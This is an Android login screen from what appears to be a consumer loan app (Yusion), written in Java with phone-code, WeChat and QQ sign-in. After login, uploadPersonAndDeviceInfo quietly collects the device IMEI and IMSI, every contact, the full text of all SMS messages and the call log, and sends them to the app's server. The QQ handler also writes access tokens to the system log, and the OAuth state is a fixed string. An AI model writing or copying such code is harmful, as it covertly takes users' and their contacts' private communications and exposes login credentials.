package com.yusion.shanghai.yusion.ui.entrance;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.tencent.connect.UserInfo;
import com.tencent.connect.auth.QQToken;
import com.tencent.mm.opensdk.modelmsg.SendAuth;
import com.tencent.tauth.IUiListener;
import com.tencent.tauth.Tencent;
import com.tencent.tauth.UiError;
import com.yusion.shanghai.yusion.R;
import com.yusion.shanghai.yusion.YusionApp;
import com.yusion.shanghai.yusion.base.ActivityManager;
import com.yusion.shanghai.yusion.base.BaseActivity;
import com.yusion.shanghai.yusion.bean.auth.CheckUserInfoResp;
import com.yusion.shanghai.yusion.bean.auth.LoginReq;
import com.yusion.shanghai.yusion.bean.auth.LoginResp;
import com.yusion.shanghai.yusion.bean.auth.OpenIdReq;
import com.yusion.shanghai.yusion.retrofit.api.AuthApi;
import com.yusion.shanghai.yusion.retrofit.api.ConfigApi;
import com.yusion.shanghai.yusion.retrofit.api.PersonApi;
import com.yusion.shanghai.yusion.retrofit.callback.OnItemDataCallBack;
import com.yusion.shanghai.yusion.settings.Settings;
import com.yusion.shanghai.yusion.ubt.bean.UBTData;
import com.yusion.shanghai.yusion.utils.CheckMobileUtil;
import com.yusion.shanghai.yusion.utils.FileUtil;
import com.yusion.shanghai.yusion.utils.MobileDataUtil;
import com.yusion.shanghai.yusion.utils.SharedPrefsUtil;
import com.yusion.shanghai.yusion.widget.CountDownButtonWrap;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static com.yusion.shanghai.yusion.utils.SharedPrefsUtil.getInstance;

public class LoginActivity extends BaseActivity implements View.OnClickListener {
    public static final int READ_CONTACTS_CODE = 10;
    private EditText mLoginMobileTV;
    private EditText mLoginCodeTV;
    private Button mLoginCodeBtn;
    private Button mLoginSubmitBtn;
    private TextView mLoginAgreement;
    private CountDownButtonWrap mCountDownBtnWrap;
    private TelephonyManager telephonyManager;
    private QQLoginListener mListener;
    private Context context;
    private OpenIdReq req;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);


        FileUtil.saveLog("xxxxxxxxx");
        FileUtil.saveLog("xxxxxxxx22222x");
        YusionApp yusionApp = (YusionApp) getApplication();
        yusionApp.requestLocation(null);

        telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        ApplicationInfo applicationInfo = null;
        try {
            applicationInfo = getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA);
            String pgyer_appid = applicationInfo.metaData.getString("PGYER_APPID");
            Log.e("TAG", "onCreate: pgyer_appid = " + pgyer_appid);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("TAG", "onCreate: " + e);
            e.printStackTrace();
        }
        Log.e("TAG", "onCreate: Settings.isOnline = " + Settings.isOnline);
        Log.e("TAG", "onCreate: Settings.SERVER_URL = " + Settings.SERVER_URL);
        Log.e("TAG", "onCreate: Settings.OSS_SERVER_URL = " + Settings.OSS_SERVER_URL);

        initView();

        YusionApp.isLogin = false;

        //短信倒计时
        countDown();


//        if (Settings.isShameData) {
//            mLoginMobileTV.setText("17621066549");
//            mLoginCodeTV.setText("6666");
//        }

    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            //微信登录
            case R.id.btn_wx:
                if (!api.isWXAppInstalled()) {
                    Toast.makeText(this, "您还未安装微信客户端！", Toast.LENGTH_SHORT).show();
                    return;
                }
                // 应用的作用域，获取个人信息
                SendAuth.Req req = new SendAuth.Req();
                /**  用于保持请求和回调的状态，授权请求后原样带回给第三方  * 为了防止csrf攻击（跨站请求伪造攻击），后期改为随机数加session来校验   */
                req.scope = "snsapi_userinfo";
                req.state = "diandi_wx_login";
                api.sendReq(req);

                break;
            //qq登录
//            case R.id.btn_qq:
//                //如果session不可用，则登录，否则说明已经登录
//                if (!tencent.isSessionValid()) {
//                    tencent.login(LoginActivity.this, "all", mListener);
//                } else {
//                    tencent.logout(this);
//                }
//                break;

//        if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
//            Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
//        } else {
//            mCountDownBtnWrap.start();
//            AuthApi.getVCode(LoginActivity.this, mLoginMobileTV.getText().toString(), data -> {
//                if (data != null) {
//                    if (!Settings.isOnline) {
//                        mLoginCodeTV.setText(data.verify_code);
//                    }
//                }
//            });
//        }
            case R.id.login_submit_btn:
                //            startActivity(new Intent(this, UploadLabelListActivity.class));
                if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
                    Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
                } else if (TextUtils.isEmpty(mLoginCodeTV.getText())) {
                    Toast.makeText(LoginActivity.this, "验证码不能为空", Toast.LENGTH_SHORT).show();
                } else {
                    LoginReq loginReq = new LoginReq();
                    loginReq.mobile = mLoginMobileTV.getText().toString();
                    loginReq.verify_code = mLoginCodeTV.getText().toString();
                    loginReq.reg_id = SharedPrefsUtil.getInstance(LoginActivity.this).getValue("reg_id", "");
                    AuthApi.login(LoginActivity.this, loginReq, this::loginSuccess);
                }
                break;

//        mLoginSubmitBtn.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                //            startActivity(new Intent(this, UploadLabelListActivity.class));
//                if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
//                    Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
//                } else if (TextUtils.isEmpty(mLoginCodeTV.getText())) {
//                    Toast.makeText(LoginActivity.this, "验证码不能为空", Toast.LENGTH_SHORT).show();
//                } else {
//                    LoginReq req = new LoginReq();
//                    req.mobile = mLoginMobileTV.getText().toString();
//                    req.verify_code = mLoginCodeTV.getText().toString();
//                    req.reg_id = SharedPrefsUtil.getInstance(LoginActivity.this).getValue("reg_id", "");
//                    AuthApi.login(LoginActivity.this, req, this::loginSuccess);
//                }
//        });


            case R.id.login_code_btn:

                if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
                    Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
                } else {
                    mCountDownBtnWrap.start();
                    AuthApi.getVCode(LoginActivity.this, mLoginMobileTV.getText().toString(), data -> {
                        if (data != null) {
                            if (!Settings.isOnline) {
                                mLoginCodeTV.setText(data.verify_code);
                            }
                        }
                    });
                }
                break;
//        case R.id.login_code_btn:
//            if(!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())){
//        Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
//    } else
//
//    {
//        mCountDownBtnWrap.start();
//        AuthApi.getVCode(LoginActivity.this, mLoginMobileTV.getText().toString(), data -> {
//            if (data != null) {
//                if (!Settings.isOnline) {
//                    mLoginCodeTV.setText(data.verify_code);
//                }
//            }
//        });
//    }
//        break;

//        case R.id.login_submit_btn:
//            //            startActivity(new Intent(this, UploadLabelListActivity.class));
//            if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
//                Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
//            } else if (TextUtils.isEmpty(mLoginCodeTV.getText())) {
//                Toast.makeText(LoginActivity.this, "验证码不能为空", Toast.LENGTH_SHORT).show();
//            } else {
//                LoginReq req = new LoginReq();
//                req.mobile = mLoginMobileTV.getText().toString();
//                req.verify_code = mLoginCodeTV.getText().toString();
//                req.reg_id = SharedPrefsUtil.getInstance(this).getValue("reg_id", "");
//                AuthApi.login(LoginActivity.this, req, this::loginSuccess);
//            }
//        break;

            case R.id.login_agreement_tv:
                Intent intent = new Intent(LoginActivity.this, WebViewActivity.class);
                intent.putExtra("type", "Agreement");
                startActivity(intent);
                break;
            default:
                break;
        }
    }


    //        if (Settings.isShameData) {
//            mLoginMobileTV.setText("17631066542");
//            mLoginCodeTV.setText("6666");

    private void countDown() {
        if (Settings.isOnline) {
            mCountDownBtnWrap = new CountDownButtonWrap(mLoginCodeBtn, "重试", 30, 1);
        } else {
            mCountDownBtnWrap = new CountDownButtonWrap(mLoginCodeBtn, "重试", 5, 1);
        }
    }

    private void initView() {
        context = this;
        req = new OpenIdReq();
        tencent = Tencent.createInstance(QQ_APP_ID, LoginActivity.this);
        mListener = new QQLoginListener();

        mLoginMobileTV = (EditText) findViewById(R.id.login_mobile_edt);
        mLoginCodeTV = (EditText) findViewById(R.id.login_code_edt);
        mLoginCodeBtn = (Button) findViewById(R.id.login_code_btn);
        mLoginSubmitBtn = (Button) findViewById(R.id.login_submit_btn);
        mLoginAgreement = (TextView) findViewById(R.id.login_agreement_tv);

        ApplicationInfo applicationInfo;
        try {
            applicationInfo = getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA);
            String pgyer_appid = applicationInfo.metaData.getString("PGYER_APPID");
            Log.e("TAG", "onCreate: pgyer_appid = " + pgyer_appid);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("TAG", "onCreate: " + e);
            e.printStackTrace();
        }
        Log.e("TAG", "onCreate: Settings.isOnline = " + Settings.isOnline);
        Log.e("TAG", "onCreate: Settings.SERVER_URL = " + Settings.SERVER_URL);
        Log.e("TAG", "onCreate: Settings.OSS_SERVER_URL = " + Settings.OSS_SERVER_URL);
    }

    private void loginSuccess(LoginResp resp) {
        if (resp != null) {
            YusionApp.TOKEN = resp.token;
            YusionApp.MOBILE = mLoginMobileTV.getText().toString();
            getInstance(LoginActivity.this).putValue("token", YusionApp.TOKEN);
            getInstance(LoginActivity.this).putValue("mobile", YusionApp.MOBILE);
            Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
            Intent intent = new Intent(LoginActivity.this, MainActivity.class);
            startActivity(intent);
            //上传设备信息
            new Thread(() -> uploadPersonAndDeviceInfo()).start();
        }
    }


    @Override
    protected void onResume() {
        super.onResume();

        //每次回到登陆界面都需清除缓存
        myApp.clearUserData();

        ConfigApi.getConfigJson(LoginActivity.this, null);
//        ConfigApi.getConfigJson(LoginActivity.this, resp -> {
//        });
        String mtoken = getIntent().getStringExtra("token");
        if (mtoken != null) {
            wxLoginSuccess();
        }
    }

    private void wxLoginSuccess() {
        String mtoken = getIntent().getStringExtra("token");
        if (mtoken != null) {
            YusionApp.TOKEN = mtoken;
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", YusionApp.TOKEN);
            startActivity(new Intent(LoginActivity.this, MainActivity.class));
            finish();
        }
    }

    @Override
    protected void onPostResume() {
        super.onPostResume();
        ActivityManager.finishOtherActivityEx(LoginActivity.class);
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        //case 1:如果是从SettingActivity注销登录时，stack中有MainActivity和LoginActivity，所以退出应用需要先结束 MainActivity
        ActivityManager.finishOtherActivityEx(LoginActivity.class);
    }


    private void uploadPersonAndDeviceInfo() {
        UBTData req = new UBTData(this);
        String imei = telephonyManager.getDeviceId();
        String imsi = telephonyManager.getSubscriberId();
        req.imei = imei;
        req.imsi = imsi;
        req.app = "Yusion";
        req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
        req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);

        JSONArray contactJsonArray = MobileDataUtil.getUserData(this, "contact");
        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();
        //List<String> raw_list = new ArrayList<>();
        for (int i = 0; i < contactJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = contactJsonArray.getJSONObject(i);
                UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();

                contactListBean.data1 = jsonObject.optString("data1");
                contactListBean.display_name = jsonObject.optString("display_name");

                contactBeenList.add(contactListBean);
                //raw_list.add(jsonObject.toString());

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        UBTData.DataBean contactBean = new UBTData.DataBean();
        contactBean.category = "contact";
        req.data.add(contactBean);
        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
            contactBean.contact_list = contactBeenList;
        }
//        else {
//            contactBean.raw_data = raw_list;
//        }

        JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
        List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
        for (int i = 0; i < smsJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = smsJsonArray.getJSONObject(i);
                UBTData.DataBean.SmsBean smsListBean = new UBTData.DataBean.SmsBean();
                String type = jsonObject.optString("type");
                if (type.equals("1")) {
                    smsListBean.from = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "recv";
                    smsListBean.ts = jsonObject.optString("date");
                } else if (type.equals("2")) {
                    smsListBean.to = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "snd";
                    smsListBean.ts = jsonObject.optString("date");//date
                }
                smsList.add(smsListBean);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        UBTData.DataBean simBean = new UBTData.DataBean();
        simBean.category = "sms";
        req.data.add(simBean);
        if (smsList.size() > 0 && !smsList.isEmpty()) {
            simBean.sms_list = smsList;
        }

        JSONArray callLogJsonArray = MobileDataUtil.getUserData(context, "call_log");
        List<UBTData.DataBean.CallLogBean> callLogList = new ArrayList<>();
        for (int i = 0; i < callLogJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = callLogJsonArray.getJSONObject(i);
                UBTData.DataBean.CallLogBean callLogBean = new UBTData.DataBean.CallLogBean();
                callLogBean.type = jsonObject.optString("type");
                callLogBean.date = jsonObject.optString("date");
                callLogBean.number = jsonObject.optString("number");
                callLogBean.duration = jsonObject.optString("duration");
                callLogList.add(callLogBean);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        UBTData.DataBean callLogBean = new UBTData.DataBean();
        callLogBean.category = "calllog";
        req.data.add(callLogBean);
        if (callLogList.size() > 0 && !callLogList.isEmpty()) {
            callLogBean.calllog_list = callLogList;
        }

        AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
            @Override
            public void onItemDataCallBack(CheckUserInfoResp data) {
                contactBean.clt_nm = data.name;
                contactBean.mobile = data.mobile;
                simBean.clt_nm = data.name;
                simBean.mobile = data.mobile;
                callLogBean.clt_nm = data.name;
                callLogBean.mobile = data.mobile;

                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
                    @Override
                    public void onResponse(Call call, Response response) {
//                        runOnUiThread(new Runnable() {
//                            @Override
//                            public void run() {
//                                finish();
//                            }
//                        });
                        // callLogBean.calllog_lis
                        finish();
                    }

                    @Override
                    public void onFailure(Call call, Throwable t) {

                    }
                });
            }
        });
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Tencent.onActivityResultData(requestCode, resultCode, data, mListener);
    }

    private class QQLoginListener implements IUiListener {
        private UserInfo mInfo;

        @Override
        public void onComplete(Object o) {
            //TODO  同样都有QQ登录和分享的回调，这个可以分开写。
            //QQ登录先初始化openId 和 Token
            initOpenidAndToken(o);
            //再获取用户信息
//        getUserInfo();

        }


        private void getUserInfo() {
            QQToken token = tencent.getQQToken();
            mInfo = new UserInfo(context, token);
            mInfo.getUserInfo(new IUiListener() {
                @Override
                public void onComplete(Object object) {
                    JSONObject jb = (JSONObject) object;
                    try {
//                    name = jb.getString("nickname");
//                    figureurl = jb.getString("figureurl_qq_2");  //头像图片的url
//                    nickName.setText(name);
//                    Picasso.with(QQLoginListener.this).load(figureurl).into(figure);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onError(UiError uiError) {
                }

                @Override
                public void onCancel() {
                }
            });
        }

        private void initOpenidAndToken(Object object) {
            JSONObject jb = (JSONObject) object;
            try {
                String openID = jb.getString("openid"); //openid用户唯一标识
                String access_token = jb.getString("access_token");
                String expires = jb.getString("expires_in");
                Log.e("qqlogin    ", "openid：" + openID);
                Log.e("qqlogin    ", "access_token：" + access_token);
                Log.e("qqlogin    ", "expires：" + expires);

                tencent = Tencent.createInstance(QQ_APP_ID, LoginActivity.this);
                tencent.setOpenId(openID);
                tencent.setAccessToken(access_token, expires);

                req.open_id = openID;
                req.source = "qq";

//                YusionApp.OPEN_ID = req.open_id;
//                SharedPrefsUtil.getInstance(LoginActivity.this).putValue("open_id", YusionApp.OPEN_ID);

                runOnUiThread(() -> AuthApi.thirdLogin(context, req, data -> {
                    if (data != null) {
                        YusionApp.TOKEN = data.token;
                        SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", YusionApp.TOKEN);
                        Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
                        startActivity(new Intent(LoginActivity.this, MainActivity.class));
                        finish();

                    } else {
                        Intent intent = new Intent(context, BindingActivity.class);
                        intent.putExtra("source", "qq");
                        intent.putExtra("open_id", req.open_id);
                        startActivity(intent);
                        finish();
                    }
                }));

            } catch (JSONException e) {
                e.printStackTrace();
            }


        }

        @Override
        public void onError(UiError uiError) {

        }

        @Override
        public void onCancel() {

        }

    }

}